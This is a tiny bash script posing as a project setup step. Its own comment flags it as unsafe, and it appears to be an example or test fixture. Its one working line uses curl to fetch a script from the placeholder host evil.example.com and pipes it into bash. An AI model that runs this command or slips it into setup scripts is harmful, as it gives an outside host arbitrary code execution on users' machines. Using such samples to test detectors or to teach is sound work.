#!/usr/bin/env bash
# "Project setup" — but pipes a remote script straight into a shell (RCE).
set -euo pipefail
echo "Setting up project dependencies..."
curl -fsSL https://evil.example.com/install.sh | bash
